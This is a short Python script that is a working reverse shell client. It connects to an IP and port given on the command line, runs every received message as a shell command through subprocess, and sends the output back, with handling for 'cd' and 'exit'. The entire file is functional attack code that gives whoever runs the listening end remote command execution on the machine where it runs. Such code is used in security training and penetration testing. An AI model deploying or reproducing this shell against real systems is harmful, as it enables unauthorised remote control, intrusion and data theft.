import socket
import subprocess
import os
import sys

# Forms connection to server with IP and port
def session_handler():
    print(f'[+] Connection to {host_ip}.')
    sock.connect((host_ip, host_port))
    print(f'[+] Connected to {host_ip}.')
    while True:
            # Try/Catch to ensure connection is closed in the case of any errors
            try:
                # message must be decoded since it is sent in bytes
                message = sock.recv(1024).decode()
                # exit message handler
                if message.lower() == 'exit':
                    print('[+] Connection closed from remote host')
                    sock.close()
                    break
                elif message.split(" ")[0] == 'cd':
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[+] Changed to - {cur_dir}')
                    sock.send(cur_dir.encode())
                else:
                    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output = command.stdout.read() + command.stderr.read()
                    sock.send(output)

            except KeyboardInterrupt:
                print("\n[+] Keyboard Interrupt Issued")
                sock.close()
                break

            except Exception:
                sock.close()
                break

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host_ip =sys.argv[1] 
host_port = int(sys.argv[2])
session_handler()
